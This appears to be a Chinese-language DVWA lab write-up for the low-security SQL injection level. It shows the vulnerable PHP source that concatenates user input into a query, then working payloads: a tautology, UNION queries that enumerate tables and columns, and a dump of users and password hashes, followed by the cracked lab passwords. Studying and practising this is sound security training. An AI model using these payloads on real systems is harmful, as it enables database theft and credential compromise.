# SQL Injection - Low

## View Source

```PHP
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

- [`mysqli_query()`](https://www.php.net/manual/zh/mysqli.query.php)
	- 對資料庫執行查詢
- [`mysqli_fetch_assoc()`](https://www.php.net/manual/zh/mysqli-result.fetch-assoc.php)
	- 將執行結果用 Associative array 回傳
- [`mysqli_error()`](https://www.php.net/manual/zh/mysqli.error.php)
	- 回傳錯誤資訊

## Code Review

- 預先定義好 *SQL* 語句來查詢使用者名稱，但透過動態生成來串接使用者輸入的 *id*
- 會將結果回傳給使用者看，不論成功失敗
- 使用 *GET*
	- E.g., `http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#`

## Answer

- 透過錯誤資訊來判斷注入語句如何串接
	- E.g., 輸入 `'`；噴出 `You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1`
1. 原本的 *PHP* 語句
	- `$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";`
2. 雙引號裡面的 *SQL* 語句
	- `SELECT first_name, last_name FROM users WHERE user_id = '$id';`
3. 構造出操作資料庫時可以執行成功的語句
	- `SELECT first_name, last_name FROM users WHERE user_id = '' OR '1'='1'; `
4. 要注入的語句
	- `' OR '1'='1`

### Example

```
' OR '1'='1
' UNION SELECT table_name, table_rows FROM information_schema.tables #
' UNION SELECT table_name, column_name FROM information_schema.columns #
' UNION SELECT user, password FROM users #
```

### Note

- 因為資料庫是將密碼用 *md5* 儲存，且使用者密碼是常見弱密碼
- 可以參照以下網站轉成明文
	- [CMD5](https://www.cmd5.com/)
	- [CrackStation](https://crackstation.net/)

```
admin	5f4dcc3b5aa765d61d8327deb882cf99 (password)
gordonb	e99a18c428cb38d5f260853678922e03 (abc123)
1337	8d3533d75ae2c3966d7e0d4fcc69216b (charley)
pablo	0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)
smithy	5f4dcc3b5aa765d61d8327deb882cf99 (password)
```